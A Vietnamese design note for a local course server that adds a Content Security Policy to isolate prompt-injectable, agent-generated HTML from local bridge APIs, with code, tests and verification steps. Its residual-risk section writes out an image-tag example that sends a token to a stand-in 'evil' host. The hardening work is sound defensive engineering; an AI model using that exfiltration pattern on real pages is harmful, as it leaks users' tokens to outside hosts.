# Phase 2 — CSP cách ly: nội dung clone/slide không chạm được "chìa khoá nhà"

## Mục tiêu

Script trong `.html` dưới `my-course/` + `intro/` (vùng nội dung do
agent/clone sinh — nguồn duy nhất có thể bị prompt-injection) **không
gọi được** `:7682`/`:7684`/`:7681` dù nó chạy cùng origin với token.
Đây là đòn bẩy lớn nhất: một header CSP đóng toàn bộ chuỗi
"XSS → gọi API → lái browser" mà không phải refactor.

## Quyết định thiết kế

Chọn CSP thay tách port (:8081) vì:

- serve tách port cần sửa `serve.*` ×2 + start script ×2 + CORS + mọi
  URL `/my-course/...` trong `app.js`/`clone-view.html` — nhiều điểm hỏng.
- CSP chỉ thêm response header trong `serve.py`/`serve.ps1`; portal và
  viewer **không đổi một dòng**.
- Clone-view edit (parent JS móc vào `frame.contentDocument`) **không
  chịu CSP của iframe** — CSP ràng buộc tài nguyên trang con tự nạp,
  không ràng buộc DOM API từ parent. Tính năng sửa trang sống nguyên.

CSP áp cho response `.html` có path bắt đầu `/my-course/` hoặc `/intro/`:

```
default-src 'self';
script-src 'self' 'unsafe-inline';
style-src 'self' 'unsafe-inline' https:;
img-src 'self' data: https:;
font-src 'self' data: https:;
media-src 'self' data:;
connect-src 'none';
form-action 'none';
base-uri 'none';
frame-ancestors 'self'
```

Lý do từng nhát siết:

- `connect-src 'none'` — chìa khoá: chặn fetch/XHR/WS/beacon/EventSource
  → trang độc không gọi được bridge, không gửi data đi đâu bằng JS.
- `form-action 'none'` — clone hay có form giả; chặn submit phishing.
- `base-uri 'none'` — chặn đổi base để hút tài nguyên về host lạ.
- `unsafe-inline` ở script/style — **bắt buộc**: slide nav và clone
  scroll-reveal là script inline hợp lệ. Residual: `javascript:` URL và
  `on*=` inline vẫn chạy — nhưng không `connect-src` thì chỉ phá được
  DOM trong trang (deface), không leo quyền.
- `img-src ... https:` — học viên chèn link ảnh ngoài qua editor.
  Residual đã phân tích: `<img src="https://evil/?t="+token>` exfil
  được token nhưng token vô dụng ngoài loopback (bridge chỉ
  127.0.0.1 + Origin-check), chấp nhận để không phá tính năng.
- `media-src 'self' data:` — `video.mp4` bài học.
- `default-src 'self'` — frame/worker/child khác mặc định chặt.

KHÔNG áp cho `/web/` (portal UI cần gọi bridge), `/site/` (trang landing
của project, tự chủ), `/templates/`, `/tools/` — giữ blast radius nhỏ;
nếu sau này muốn siết thêm thì mở rộng danh sách prefix.

## File động

| File | Action | Việc |
|---|---|---|
| `tools/serve.py` | modify | thêm CSP khi `send_head` serve `.html` thuộc prefix trên |
| `tools/serve.ps1` | modify | parity — **giữ BOM** |
| `tools/test-bridges.py` | modify | case 21–22 (CSP có/không có đúng chỗ) |
| `docs/SECURITY.md` | modify | mô tả boundary mới + residual |
| `docs/clone-pipeline.md` | modify | ghi ràng buộc: clone KHÔNG được phụ thuộc fetch/WS external |

## Chi tiết serve.py

Trong `send_head`, sau `send_response(200)` trước `end_headers()`:

```python
CSP_PATHS = ("/my-course/", "/intro/")
CSP = ("default-src 'self'; script-src 'self' 'unsafe-inline'; "
       "style-src 'self' 'unsafe-inline' https:; "
       "img-src 'self' data: https:; font-src 'self' data: https:; "
       "media-src 'self' data:; connect-src 'none'; "
       "form-action 'none'; base-uri 'none'; frame-ancestors 'self'")

raw_path = urllib.parse.urlparse(self.path).path
if raw_path.startswith(CSP_PATHS) and raw_path.lower().endswith((".html", ".htm")):
    self.send_header("Content-Security-Policy", CSP)
```

`serve.ps1`: cùng điều kiện trên `$ctx.Request.Url.LocalPath`, add header
`Content-Security-Policy` trước khi ghi response.

## Test bổ sung

| # | Case | Kỳ vọng |
|---|------|---------|
| 21 | `GET /my-course/manifest.json` → không CSP; `GET /<file .html trong my-course>` → có `connect-src 'none'` | đúng phạm vi |
| 22 | `GET /web/index.html` | KHÔNG có CSP header |
| 23 (tay) | mở clone-view → bấm Sửa → đổi chữ/ảnh → Lưu → mở lại | edit sống nguyên |
| 24 (tay) | mở slide bài học → nút chuyển slide | script inline vẫn chạy |

## Verify chuỗi tấn công chết

Sau phase, trong trang clone mở DevTools console thử:

```js
fetch('http://localhost:7682/api/health')   // → bị CSP chặn
new WebSocket('ws://localhost:7684/ext')    // → bị CSP chặn
```

Cả hai phải báo `Refused to connect ... violates Content Security
Policy` — đây là bằng chứng lỗ hổng B đã đóng.
